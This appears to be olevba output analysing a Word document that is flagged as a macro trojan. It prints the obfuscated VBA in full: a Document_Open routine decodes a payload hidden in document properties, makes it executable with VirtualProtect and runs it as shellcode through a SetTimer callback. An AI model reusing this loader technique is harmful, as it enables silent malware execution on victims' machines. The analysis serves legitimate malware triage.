olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-34aafdb7caaf1f240fa8b1bfcc2365188969d72aa541190537b02a8cc8e0e0e5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-34aafdb7caaf1f240fa8b1bfcc2365188969d72aa541190537b02a8cc8e0e0e5 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function DiarySesperal Lib "user32" Alias "KillTimer" (ByVal ParcheesiConvalescentlySuperinformality As LongPtr, ByVal EriphyleChondroendothelioma As LongPtr) As LongPtr
#Else
Private Declare Function PrehistoricallyRajasthani Lib "user32" Alias "SetTimer" ( ByVal AlawiFolding As Long, ByVal PerversionsUnprismaticallyCardiosphygmogram As Long, ByVal DynamostaticPortunalia As Long, ByVal CymatiaParquetage As Any) As Long
#End If
#If VBA7 Then
Private Declare PtrSafe Function PrehistoricallyRajasthani Lib "user32" Alias "SetTimer" (ByVal PinpricksAcipenseroid As LongPtr, ByVal PolyparasiticAdvisor As LongPtr, ByVal BooteeParsoned As LongPtr, ByVal SanctifyInteractionalBorzois As LongPtr) As LongPtr
Private Declare PtrSafe Function CostumesRaffishness Lib "kernel32" Alias "VirtualProtect" (ByVal SurrosionLolly As LongPtr, ByVal ProvideNonvigilant As LongPtr, ByVal RaspberrySerpentinized As LongPtr, PolarGlabellous As LongPtr) As LongPtr
#Else
Private Declare Function CostumesRaffishness Lib "kernel32" Alias "VirtualProtect"  (ByVal PerchlorethanePulvinule As Long, ByVal CatchweedSubsselliaBichromic As Long, ByVal SubovarianLordkinKomondoroc As Long, SubinferredBroughamsPalmira As Long) As Long
Private Declare Function DiarySesperal Lib "user32" Alias "KillTimer" ( ByVal ClothiersCreamer As Long, ByVal DiaereticOpining As Long) As Long
#End If
Private Sub Document_Open()
Dim JoggledAndrocracySemipsychologically() As Byte
#If Win64 Then
JoggledAndrocracySemipsychologically = HangnestsShegetz(ActiveDocument.BuiltInDocumentProperties(bR7UAazwr("dM6kb_N8")).Value)
#Else
JoggledAndrocracySemipsychologically = HangnestsShegetz(ActiveDocument.BuiltInDocumentProperties(bR7UAazwr("bIfCiOFxI")).Value)
#End If
#If VBA7 Then
Dim ProklausisUnstubbed As LongPtr
Dim CritchBadmouthingTieclasp As LongPtr
Dim PalaticQuadriremeOverphysic As LongPtr
Dim NomismaSkilty As LongPtr
#Else
Dim ProklausisUnstubbed As Long
Dim CritchBadmouthingTieclasp As Long
Dim PalaticQuadriremeOverphysic As Long
Dim NomismaSkilty As Long
#End If
CritchBadmouthingTieclasp = UBound(JoggledAndrocracySemipsychologically) + 1
PalaticQuadriremeOverphysic = VarPtr(JoggledAndrocracySemipsychologically(0))
CostumesRaffishness PalaticQuadriremeOverphysic, CritchBadmouthingTieclasp, 64, VarPtr(ProklausisUnstubbed)
GetObject(bR7UAazwr("FESUwdYV4H")).Environment(bR7UAazwr("r4nEs1Fv"))(bR7UAazwr("nTl6Mv")) = ActiveDocument.FullName
GetObject(bR7UAazwr("FOON4xpYyRXN")).Environment(bR7UAazwr("eUQ7Q0UhUXo"))(bR7UAazwr("GufiHvdjhQ")) = bR7UAazwr("QPrKwXmSt5KZ")
If True Then
NomismaSkilty = PrehistoricallyRajasthani(0, PalaticQuadriremeOverphysic, 1, PalaticQuadriremeOverphysic)
UndependentModelingsSectarianised 1
DiarySesperal 0, NomismaSkilty
End If
GetObject(bR7UAazwr("F1ZiaUiM1")).Environment(bR7UAazwr("mZgHVcY")).Remove (bR7UAazwr("ATsvedzFwD"))
GetObject(bR7UAazwr("TCmFSwoPw1")).Environment(bR7UAazwr("YiAWjJ8lEZ")).Remove (bR7UAazwr("k9OC4Rr"))
ReDim JoggledAndrocracySemipsychologically(1)
End Sub
Sub UndependentModelingsSectarianised(Finish)
Dim TotalizedHaboubOphthalmol As Long
Dim MicasizeAngryRevenged As Long
MicasizeAngryRevenged = Timer() + (Finish)
Do
TotalizedHaboubOphthalmol = Timer()
DoEvents
Loop Until TotalizedHaboubOphthalmol > MicasizeAngryRevenged
End Sub
Function PinchersHatchable(UncooperativelyCurmurringPalladosammine, DrollerAmitriptyline)
PinchersHatchable = Mid(UncooperativelyCurmurringPalladosammine, DrollerAmitriptyline + 1, 1)
End Function
Function AntimarkTrochiteUndertaxing(KitthogeConcitizenAnniversary) As Long
If Int(Rnd(23)) > 2 Then
AntimarkTrochiteUndertaxing = 9000
Else
AntimarkTrochiteUndertaxing = Len(KitthogeConcitizenAnniversary)
End If
End Function
Public Function bR7UAazwr(strInput)
bR7UAazwr = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function HangnestsShegetz(InvarianceToldo)
ReDim LogomachicalEsophagoplastyMonasticize(AntimarkTrochiteUndertaxing(InvarianceToldo) - 1) As Byte
Dim EpanagogeGodfathers As Long, GerbeSugaringAudiometry As Long
Dim TetanusExpergefacient: TetanusExpergefacient = bR7UAazwr("zaKEuJbUhM") & bR7UAazwr("ZyzwtTKkD")
For EpanagogeGodfathers = 0 To AntimarkTrochiteUndertaxing(InvarianceToldo) - 1 Step 2
GerbeSugaringAudiometry = EpanagogeGodfathers / 2
LogomachicalEsophagoplastyMonasticize(GerbeSugaringAudiometry) = CDec(TetanusExpergefacient & PinchersHatchable(InvarianceToldo, EpanagogeGodfathers) & PinchersHatchable(InvarianceToldo, EpanagogeGodfathers + 1))
Next
HangnestsShegetz = LogomachicalEsophagoplastyMonasticize
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

